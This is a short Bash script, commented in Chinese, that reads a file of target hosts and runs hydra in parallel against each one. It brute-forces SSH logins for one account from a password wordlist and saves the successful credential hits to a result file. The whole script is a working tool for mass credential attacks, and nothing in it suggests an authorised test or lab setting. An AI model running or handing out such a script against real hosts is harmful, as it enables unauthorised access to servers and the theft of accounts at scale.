#!/bin/bash

# 检查输入参数数量
if [ "$#" -ne 5 ]; then
  echo "用法: $0 目标文件 账号 密码文件 线程数量 结果文件"
  exit 1
fi

# 读取输入参数
TARGET_FILE=$1
USER=$2
PASS_FILE=$3
THREADS=$4
RESULT_FILE=$5

# 检查目标文件是否存在
if [ ! -f "$TARGET_FILE" ]; then
  echo "$TARGET_FILE 文件不存在"
  exit 1
fi

# 计算目标文件中的行数
line_count=$(wc -l < "$TARGET_FILE")

# 定义一个临时文件，用于存储目标地址
temp_file=$(mktemp)

# 将每一行添加行号，并保存到临时文件
nl -w1 -s' ' "$TARGET_FILE" > "$temp_file"

# 定义处理函数
process_line() {
  local line_num=$1
  local target=$2
  echo "[$line_num/$line_count] 正在处理: $target"
  hydra -l "$USER" -P "$PASS_FILE" "$target" ssh 2>&1 | grep "\[22\]\[ssh\]" >> "$RESULT_FILE"
}

# 读取临时文件并使用后台作业并行处理
jobs=()
while IFS= read -r line; do
  line_num=$(echo "$line" | awk '{print $1}')
  target=$(echo "$line" | awk '{print substr($0, index($0, $2))}')
  process_line "$line_num" "$target" &
  
  # 保持后台作业的数量在限制内
  if [ ${#jobs[@]} -ge "$THREADS" ]; then
    wait -n
    jobs=()
  fi
  
  jobs+=($!)
done < "$temp_file"

# 等待所有后台作业完成
wait

# 清理临时文件
rm "$temp_file"

echo "所有任务已完成，结果已保存到 $RESULT_FILE"
